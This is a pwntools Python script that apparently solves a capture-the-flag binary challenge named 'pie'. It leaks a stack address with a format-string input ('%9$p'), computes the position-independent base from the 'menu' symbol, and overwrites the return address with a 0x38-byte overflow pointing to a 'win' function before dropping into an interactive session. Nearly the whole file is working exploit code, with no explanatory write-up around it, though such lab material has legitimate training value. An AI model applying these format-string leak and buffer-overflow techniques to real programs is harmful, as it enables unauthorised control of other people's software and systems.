from pwn import *
import shutil

context.terminal = ['xterm', '-e']  # Default to xterm if no suitable terminal is found

elf = ELF('./pie')
p = process('./pie')
# gdb.attach(p, gdbscript='break main')

p.sendlineafter(b"Option: ", b"2") # Send number 2 to the process
p.sendlineafter(b"Please enter your search term:\n", b"%9$p")

leak = p.recvline()
leak = leak.split(b"term: ")[1].strip(b"\n")
addr = int(leak, base=16)
p.sendlineafter(b"to menu.", b"1")

p.sendlineafter(b"Option: ", b"3") # Send number 2 to the process
p.sendlineafter(b"Input to bake your pie: ", b"x/x " + leak)

function_name = p.recvline()
print(function_name)

#Take base offset
base_addr = addr - (elf.sym.menu + 302)

#win addr
win_addr = base_addr + (elf.sym.win)

hex_str = hex(win_addr)[2:] #Remove 0x that is automatically assign by python

if len(hex_str) % 2 != 0:
    hex_str = '0' + hex_str

hex_pairs = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]

inputChar = ''.join(chr(int(pair, 16)) for pair in reversed(hex_pairs))

injectInput = "A" * 0x38 + inputChar

#Another method
elf.address = addr - (elf.sym.menu + 302)
payload = b"A" * 0x38
payload += p64(elf.sym.win)

# Get into bake
p.sendlineafter(b"Option: ", b"3")
p.sendlineafter(b"Input to bake your pie: ", payload)
p.interactive()
